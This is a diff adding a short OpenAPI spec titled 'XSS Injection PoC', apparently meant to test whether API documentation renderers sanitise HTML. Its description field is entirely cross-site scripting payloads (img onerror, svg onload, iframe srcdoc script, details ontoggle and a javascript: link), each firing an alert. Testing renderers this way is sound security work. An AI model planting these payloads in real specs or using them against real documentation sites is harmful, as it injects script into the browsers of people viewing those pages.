@@ -1,0 +1,15 @@
+openapi: "3.0.0"
+info:
+  title: XSS Injection PoC
+  version: "1.0.0"
+  description: |
+    <img src=x onerror=alert(1)>
+
+    <svg onload=alert(1)></svg>
+
+    <iframe srcdoc="<script>alert('XSS')</script>"></iframe>
+
+    <details open ontoggle=alert(1)>Toggle me</details>
+
+    <a href="javascript:alert(1)">Click me</a>
+paths: {}
